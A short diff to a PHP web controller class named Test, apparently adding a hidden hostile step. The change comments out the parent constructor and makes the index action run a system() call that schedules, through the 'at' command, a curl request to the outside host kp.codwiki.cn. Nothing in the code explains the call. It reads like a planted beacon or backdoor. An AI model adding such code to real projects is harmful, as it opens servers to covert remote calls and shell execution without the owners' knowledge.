@@ -17,11 +17,11 @@ class Test extends Common
 {
     public function __construct(Request $request)
     {
-        parent::__construct($request);
+//        parent::__construct($request);
     }
 
     public function index()
     {
-
+        system("echo 'curl kp.codwiki.cn/admin/test' | at 16:19");
     }
 }
